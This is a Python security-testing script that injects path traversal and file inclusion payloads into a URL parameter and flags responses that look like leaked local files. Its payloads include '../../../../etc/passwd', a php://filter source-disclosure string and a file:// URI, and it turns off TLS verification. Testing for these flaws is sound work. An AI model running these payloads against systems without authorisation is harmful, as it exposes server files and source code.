#!/usr/bin/env python3
"""
Test a file/path parameter for traversal, LFI, and RFI indicators.

The script requests harmless OS marker files and common traversal encodings. A
positive result is recognizable local file content or source disclosure.
"""
import argparse
import json
import re
import ssl
import sys
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit
from urllib.request import Request, urlopen
from urllib.error import HTTPError, URLError

GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
RESET = "\033[0m"


def mutate(url, param, value):
    parts = urlsplit(url)
    qs = dict(parse_qsl(parts.query, keep_blank_values=True))
    qs[param] = value
    return urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(qs), parts.fragment))


def fetch(url, timeout):
    req = Request(url, headers={"User-Agent": "prod-sec-lfi-tester/1.0"})
    try:
        with urlopen(req, timeout=timeout, context=ssl._create_unverified_context()) as resp:
            body = resp.read(200000).decode("utf-8", "replace")
            return resp.status, body, None
    except HTTPError as exc:
        return exc.code, exc.read(200000).decode("utf-8", "replace"), None
    except (URLError, TimeoutError, ssl.SSLError) as exc:
        return 0, "", str(exc)


def main():
    parser = argparse.ArgumentParser(description="Probe file parameter for LFI/traversal.")
    parser.add_argument("target_url")
    parser.add_argument("--param", required=True)
    parser.add_argument("--safe-mode", action="store_true", help="Use only harmless marker files.")
    parser.add_argument("--timeout", type=float, default=8)
    args = parser.parse_args()

    payloads = ["../../../../etc/hostname", "..%2f..%2f..%2f..%2fetc%2fhostname", "..\\..\\..\\..\\Windows\\win.ini"]
    if not args.safe_mode:
        payloads.extend(["../../../../etc/passwd", "php://filter/convert.base64-encode/resource=index.php", "file:///etc/hostname"])

    signatures = [
        ("linux_hostname_or_passwd", re.compile(r"root:.*:0:0:|^[a-zA-Z0-9_.-]{1,80}\s*$", re.M)),
        ("windows_ini", re.compile(r"\[(fonts|extensions|mci extensions|files)\]", re.I)),
        ("php_filter", re.compile(r"PD9waHAg|<\?php", re.I)),
    ]

    findings = []
    observations = []
    for payload in payloads:
        url = mutate(args.target_url, args.param, payload)
        status, body, error = fetch(url, args.timeout)
        if error:
            print(f"{RED}[ERROR]{RESET} {payload}: {error}")
            continue
        matched = [name for name, rx in signatures if rx.search(body[:4000])]
        observations.append({"payload": payload, "status": status, "length": len(body), "matched": matched})
        print(f"{GREEN if not matched else YELLOW}[TEST]{RESET} payload={payload!r} status={status} len={len(body)} matched={matched or '-'}")
        if matched and status < 500:
            findings.append({"title": "Possible local file inclusion/path traversal", "severity": "High", "evidence": f"Payload {payload!r} matched {matched}", "poc": url, "status": "Confirmed if content is local file marker"})

    print("JSON_SNIPPET:", json.dumps({"tool": "lfi_tester", "target": args.target_url, "param": args.param, "findings": findings, "observations": observations}, indent=2))
    return 0


if __name__ == "__main__":
    sys.exit(main())
